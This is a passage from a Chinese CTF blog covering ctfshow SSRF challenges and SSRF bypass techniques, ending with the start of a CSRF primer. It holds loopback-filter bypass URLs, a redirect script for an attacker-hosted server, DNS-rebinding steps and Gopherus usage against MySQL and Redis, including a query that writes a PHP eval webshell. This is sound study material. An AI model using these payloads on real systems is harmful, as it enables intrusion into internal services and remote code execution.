class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>相比于上题，waf了本地回环地址，尝试用其他进制的IP绕过即可。</p>
<p>但实际上，这里源码是写错了，没有传参匹配导致恒为真，所以没有任何限制。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416002956517.png" alt="image-20250416002956517"></p>
<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><p>正则如下：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/localhost</span>|127\<span class="string">.0</span>\.|\。<span class="string">/i</span></span><br></pre></td></tr></table></figure>

<p>多过滤了<code>。</code>还是用上题的思路即可。</p>
<p>这题有多种绕过思路，网上都总结了很多，这里随便贴一份相对全的：</p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">进制绕过 		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>绕过		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line">特殊的地址<span class="number">0</span>，		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0/flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个 0 在linux系统中一般会解析成127.0.0.1 ，在windows 和 macos 中一般解析成0.0.0.0</span></span><br><span class="line"></span><br><span class="line">还有			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.1/flag.php //可省略0</span></span><br><span class="line">还有			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.0000000000000.001/flag.php</span></span><br><span class="line">特殊字符       <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//①②⑦.⓪.⓪.①/flag.php</span></span><br><span class="line">用中文句号绕过  <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127。0。0。1/</span></span><br></pre></td></tr></table></figure>



<h3 id="web354-公共解析域名绕过"><a href="#web354-公共解析域名绕过" class="headerlink" title="web354 公共解析域名绕过"></a>web354 公共解析域名绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>过滤了0和1就有些难搞了，不过这里可以去网上搜索一些公共的能够域名解析到127.0.0.1的url。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416080803299.png" alt="image-20250416080803299"></p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//safe.taobao.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//114.taobao.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//wifi.aliyun.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//imis.qq.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//localhost.sec.qq.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//ecd.tencent.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//sudo.cc/</span></span><br></pre></td></tr></table></figure>

<p>直接用就好了。</p>
<p>更多的可以通过域名解析结果反向查找：<a target="_blank" rel="noopener" href="https://site.ip138.com/127.0.0.1/">127.0.0.1上的网站 127.0.0.1同iP域名查询 127.0.0.1域名反查</a></p>
<h3 id="web355-长度限制1"><a href="#web355-长度限制1" class="headerlink" title="web355 长度限制1"></a>web355 长度限制1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>) &lt;= <span class="number">5</span>))</span><br></pre></td></tr></table></figure>

<p>增加了长度限制，用<code>url=http://0/flag.php</code>、 <code>url=http://127.1/flag.php</code>都可以。</p>
<h3 id="web356-长度限制2"><a href="#web356-长度限制2" class="headerlink" title="web356 长度限制2"></a>web356 长度限制2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>url=http://0/flag.php</code>仍然可用。</p>
<h3 id="web357-内网IP过滤"><a href="#web357-内网IP过滤" class="headerlink" title="web357 内网IP过滤"></a>web357 内网IP过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过了一些过滤，我们去查查这些都是什么：</p>
<h4 id="filter-var-函数"><a href="#filter-var-函数" class="headerlink" title="filter_var() 函数"></a>filter_var() 函数</h4><p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416083848457.png" alt="image-20250416083848457"></p>
<h4 id="相关过滤器"><a href="#相关过滤器" class="headerlink" title="相关过滤器"></a>相关过滤器</h4><table>
<thead>
<tr>
<th><a target="_blank" rel="noopener" href="https://www.runoob.com/php/filter-validate-ip.html">FILTER_VALIDATE_IP</a></th>
<th>把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围。</th>
</tr>
</thead>
</table>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416084453141.png" alt="image-20250416084453141"></p>
<p>所以可知，要求ip不在 RFC 指定的私有范围IP内（比如 192.168.0.1），也不在保留的IP范围内。</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>范围</th>
<th>为什么被限制？</th>
</tr>
</thead>
<tbody><tr>
<td>私有地址</td>
<td><code>10.</code>, <code>172.16-31.</code>, <code>192.168.</code></td>
<td>内网地址，不能让用户探测</td>
</tr>
<tr>
<td>保留地址</td>
<td><code>127.</code>, <code>169.254.</code>, <code>224.</code>, <code>240.</code>, <code>255.</code></td>
<td>有特殊含义&#x2F;不允许外部通信</td>
</tr>
</tbody></table>
<p>以下两种方法实操可见最下方的bypass总结中。</p>
<p><strong>method1 公网挂马</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/Quicker_20250416_091903.png" alt="Quicker_20250416_091903"></p>
<p><strong>method2 DNS重绑定</strong></p>
<p>常用工具<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a></p>
<p>构造恰当的URL，例如用google，baidu这些官网的dns解析ip来进行交替（ping 可以查看），可以看到DNS解析在不断变换：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416102926004.png" alt="image-20250416102926004"></p>
<p>没成功的话，多刷新几次。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416105222070.png" alt="image-20250416105222070"></p>
<h3 id="web358-绕过"><a href="#web358-绕过" class="headerlink" title="web358 @绕过"></a>web358 @绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>需要匹配正则表达，满足<code>http://ctf.</code>开头，<code>show</code>结尾，而且能解析。</p>
<p>构造如下：</p>
<p><a target="_blank" rel="noopener" href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a></p>
<p>利用参数查询<code>?</code>，或者锚点<code>#</code>绕过show</p>
<p>在Parse_url函数中我们提到过，该函数会把@前后分段开，分为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[host] =&gt; hostname			<span class="comment">//@后</span></span><br><span class="line">[user] =&gt; username			<span class="comment">//@前</span></span><br><span class="line">[pass] =&gt; password			<span class="comment">//@前</span></span><br></pre></td></tr></table></figure>

<p>于是它实际解析的仍然是指向127.0.0.1的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416112945370.png" alt="image-20250416112945370"></p>
<h3 id="web359-Gopher打无密码的mysql"><a href="#web359-Gopher打无密码的mysql" class="headerlink" title="web359 Gopher打无密码的mysql"></a>web359 Gopher打无密码的mysql</h3><p>进来一个登录框，抓包发现有一个returl参数，</p>
<p>需要下载一个生成gopher协议的payload工具：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
<p>usage：<code>python2 gopherus.py --exploit mysql</code></p>
<p>用户为root,query为 <code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/shell.php&#39;;</code></p>
<p>并且将生成的payload再次进行url编码，因为解析时会解密一层。</p>
<p>替换到returl参数的值后发包，然后蚁剑连接即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416193201139.png" alt="image-20250416193201139"></p>
<h3 id="web360-Gopher协议打redis"><a href="#web360-Gopher协议打redis" class="headerlink" title="web360 Gopher协议打redis"></a>web360 Gopher协议打redis</h3><p>hint：打redis</p>
<p>同上题一样，换个payload，usage：<code>python2 gopherus.py --exploit redis</code></p>
<p>操作一样，最后</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416194828764.png" alt="image-20250416194828764"></p>
<h2 id="刷题之后的bypass总结"><a href="#刷题之后的bypass总结" class="headerlink" title="刷题之后的bypass总结"></a>刷题之后的bypass总结</h2><h3 id="字符绕过"><a href="#字符绕过" class="headerlink" title="字符绕过"></a>字符绕过</h3><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">进制绕过 		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>绕过		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line">特殊的地址<span class="number">0</span>，		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0/flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个 0 在linux系统中一般会解析成127.0.0.1 ，在windows 和 macos 中一般解析成0.0.0.0</span></span><br><span class="line"></span><br><span class="line">还有			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.1/flag.php //可省略0</span></span><br><span class="line">还有			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.0000000000000.001/flag.php</span></span><br><span class="line">特殊字符       <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//①②⑦.⓪.⓪.①/flag.php</span></span><br><span class="line">用中文句号绕过  <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127。0。0。1/</span></span><br></pre></td></tr></table></figure>

<h3 id="公网挂马"><a href="#公网挂马" class="headerlink" title="公网挂马"></a>公网挂马</h3><p>打重定向</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段 PHP 脚本的作用是：</p>
<ul>
<li><p>当某个目标服务器访问你的公网服务时，比如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-public-ip:port/malicious.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>它会返回一个 HTTP 重定向：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>于是，<strong>如果目标服务器自动跟随重定向</strong>，它会**转头请求自己的 <code>127.0.0.1/flag.php</code>**。</p>
</li>
</ul>
<h3 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h3><p>参考：<a target="_blank" rel="noopener" href="https://bblog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/04.SSRF/01.DNS%E9%87%8D%E7%BB%91%E5%AE%9A.html">01.DNS重绑定 · d4m1ts 知识库</a></p>
<p>常用工具<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a></p>
<p>指攻击者通过DNS服务器将域名解析到恶意IP地址，然后再将其解析到合法IP地址，从而绕过后端的安全检查。<strong>其本质就是欺骗客户端请求的IP地址。</strong></p>
<p>看网上的文章感觉不是很形象，但GPT的讲解很通透，我在这里贴一下：</p>
<blockquote>
<h2 id="💡-实战场景举个例子"><a href="#💡-实战场景举个例子" class="headerlink" title="💡 实战场景举个例子"></a>💡 实战场景举个例子</h2><p>设想有一个网站：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /fetch?url=http://example.com</span><br></pre></td></tr></table></figure>

<p>它会请求你传的 <code>url</code>，但有如下限制：</p>
<ul>
<li>❌ 禁止 IP 是 <code>127.0.0.1</code></li>
<li>✅ 允许你填入域名，例如 <code>evil.rbndr.us</code></li>
</ul>
<p>你设置 <code>evil.rbndr.us</code> 这个域名：</p>
<ul>
<li><strong>第一次解析：指向你的服务器（公网 IP）</strong></li>
<li>**第二次解析：变成 <code>127.0.0.1</code> 或 <code>169.254.169.254</code>**！</li>
</ul>
<p>于是 SSRF 访问你的域名 → 其实打到了 <strong>目标的内网服务</strong>。</p>
<h2 id="🧠-详细过程"><a href="#🧠-详细过程" class="headerlink" title="🧠 详细过程"></a>🧠 详细过程</h2><ol>
<li>SSRF 发请求：<code>http://evil.rbndr.us</code></li>
<li>DNS 解析 <code>evil.rbndr.us</code>，第一次解析结果是你的公网 IP</li>
<li>目标服务请求了你服务器（你控制）</li>
<li>你服务器<strong>什么也不返回，挂着不处理</strong></li>
<li>等 DNS 缓存过期后（几秒）</li>
<li>再次解析 <code>evil.rbndr.us</code> → <strong>变成 <code>127.0.0.1</code></strong></li>
<li>SSRF 继续跟随请求：访问 <code>http://127.0.0.1</code></li>
</ol>
<p>💥 成功 SSRF 打到了内网！</p>
</blockquote>
<h3 id="Gopherus使用"><a href="#Gopherus使用" class="headerlink" title="Gopherus使用"></a>Gopherus使用</h3><ol>
<li><p>安装</p>
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/tarunkant/Gopherus.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>payload支持:</p>
<ul>
<li>MySQL 有效负载</li>
<li>FastCGI 有效负载</li>
<li>Memcached 有效负载</li>
<li>Redis 有效负载</li>
<li>Zabbix 有效载荷</li>
<li>SMTP 有效负载</li>
</ul>
</li>
<li><p>以无密码mysql为例：</p>
<p> usage：<code>python2 gopherus.py --exploit mysql</code></p>
<p> 用户为<code>root</code>，query为 <code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/shell.php&#39;;</code></p>
</li>
</ol>
<h2 id="关于Gopher协议为什么后面要有一个"><a href="#关于Gopher协议为什么后面要有一个" class="headerlink" title="关于Gopher协议为什么后面要有一个_?"></a>关于Gopher协议为什么后面要有一个<code>_</code>?</h2><p>这里贴一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Y0uhe/p/15837670.html">CTFSHOW-SSRF篇 - LinkPoc - 博客园</a>这篇博客中的一张图片：<br><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/2289942-20220124211658010-532695203.png" alt="img"></p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF - FreeBuf网络安全行业门户</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rpup/p/18100622">CSRF 与SSRF基础 及ctfshow 练习 - 折翼的小鸟先生 - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://nanian-233.github.io/posts/ssrf.html#%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87">SSRF | Nanian233🍊’s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/140337605">SSRF漏洞深入利用与防御方案绕过技巧_ssrf绕过-CSDN博客</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/CSRF%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/wz.jpg">
      <meta itemprop="name" content="y@7q">
      <meta itemprop="description" content="心不畏死，踏屍前行">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="y@7q">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/CSRF%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">CSRF学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-12 21:59:26" itemprop="dateCreated datePublished" datetime="2025-04-12T21:59:26+08:00">2025-04-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-16 07:11:49" itemprop="dateModified" datetime="2025-04-16T07:11:49+08:00">2025-04-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">基础知识搭建</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[TOC]</p>
<h1 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h1><p>Cross-site request forgery 简称为“CSRF”，中文名为跨站请求伪造。攻击者精心构造一个请求来诱导受害者点击，假如此时受害者刚好打开了相关网站，则有可能会导致执行了相关恶意操作。</p>
<p><strong>攻击场景（某购物网站）</strong></p>
<p>攻击者A尝试修改受害者B的账户邮箱地址，他发现该网站在修改邮箱时候发送的请求类似于<code>http://xxx.com/edit.php?email=123@123.com&amp;Change=Change</code>，通过加以包装和诱导B进行点击，这便可能会使得B的邮箱被修改从而达到了A的目的。</p>
<p><strong>CSRF攻击需要条件</strong></p>
<ul>
<li><p>目标网站没有防CSRF的处理，导致了请求容易被伪造</p>
<blockquote>
<p>判断一个网站是否有CSRF漏洞，就要看他的增删改操作是否容易被伪造。</p>
</blockquote>
</li>
<li><p>受害者再点击恶意链接时，必须是在同一台设备处于已登录的状态</p>
</li>
